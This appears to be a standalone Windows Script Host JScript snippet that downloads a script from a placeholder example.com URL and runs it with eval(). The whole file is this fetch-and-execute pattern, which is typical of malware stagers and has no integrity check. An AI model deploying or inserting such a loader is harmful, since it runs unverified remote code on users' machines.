var URL = "http://example.com/remote_script.js"; // Replace with your actual URL
var WinHttpReq = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", URL, false);
WinHttpReq.Send();
WinHttpReq.WaitForResponse();

// Check for successful response (optional but recommended)
if (WinHttpReq.Status == 200) {
    var remoteContent = WinHttpReq.ResponseText;
    // Execute the downloaded content
    eval(remoteContent);
} else {
    WScript.Echo("Error downloading remote script: " + WinHttpReq.Status + " " + WinHttpReq.StatusText);
}
